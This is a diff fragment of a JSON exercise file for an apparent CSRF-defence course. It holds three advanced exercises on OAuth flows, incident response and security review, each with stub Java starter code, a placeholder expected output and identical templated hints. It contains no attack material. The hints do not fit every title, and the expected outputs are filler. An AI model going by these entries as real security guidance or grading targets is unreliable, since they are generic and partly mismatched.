+          "exercise_id": "ex_58",
+          "title": "Exercise 58: CSRF in OAuth Flows",
+          "description": "Protect OAuth authorization flow from CSRF.",
+          "difficulty": "advanced",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 8,
+          "ai_intro": "Real applications, real defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== CSRF in OAuth Flows ===\");\n        // TODO: This is a comprehensive challenge\n        // Combine token generation, validation, cookie config,\n        // and Origin checks into a complete solution.\n    }\n}",
+          "expected_output": "=== CSRF in OAuth Flows ===\n(Comprehensive output)",
+          "hints": [
+            {
+              "message": "Break this into smaller steps: (1) identify vulnerable endpoints, (2) add tokens, (3) configure cookies, (4) test."
+            },
+            {
+              "message": "For CSRF in OAuth Flows: apply all 4 layers of defence (tokens, SameSite, Origin, re-auth)."
+            },
+            {
+              "message": "The Complete CSRF Filter + Defence in Depth examples show the full pattern."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_59",
+          "title": "Exercise 59: CSRF Incident Response",
+          "description": "Respond to a detected CSRF attack.",
+          "difficulty": "advanced",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 8,
+          "ai_intro": "Real applications, real defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== CSRF Incident Response ===\");\n        // TODO: This is a comprehensive challenge\n        // Combine token generation, validation, cookie config,\n        // and Origin checks into a complete solution.\n    }\n}",
+          "expected_output": "=== CSRF Incident Response ===\n(Comprehensive output)",
+          "hints": [
+            {
+              "message": "Break this into smaller steps: (1) identify vulnerable endpoints, (2) add tokens, (3) configure cookies, (4) test."
+            },
+            {
+              "message": "For CSRF Incident Response: apply all 4 layers of defence (tokens, SameSite, Origin, re-auth)."
+            },
+            {
+              "message": "The Complete CSRF Filter + Defence in Depth examples show the full pattern."
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_60",
+          "title": "Exercise 60: Complete Security Review",
+          "description": "Audit an application for all CSRF vulnerabilities.",
+          "difficulty": "advanced",
+          "category": "Real-World Challenges",
+          "estimated_minutes": 8,
+          "ai_intro": "Real applications, real defences!",
+          "starter_code": "public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"=== Complete Security Review ===\");\n        // TODO: This is a comprehensive challenge\n        // Combine token generation, validation, cookie config,\n        // and Origin checks into a complete solution.\n    }\n}",
+          "expected_output": "=== Complete Security Review ===\n(Comprehensive output)",
+          "hints": [
+            {
+              "message": "Break this into smaller steps: (1) identify vulnerable endpoints, (2) add tokens, (3) configure cookies, (4) test."
+            },
+            {
+              "message": "For Complete Security Review: apply all 4 layers of defence (tokens, SameSite, Origin, re-auth)."
+            },
+            {
+              "message": "The Complete CSRF Filter + Defence in Depth examples show the full pattern."
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
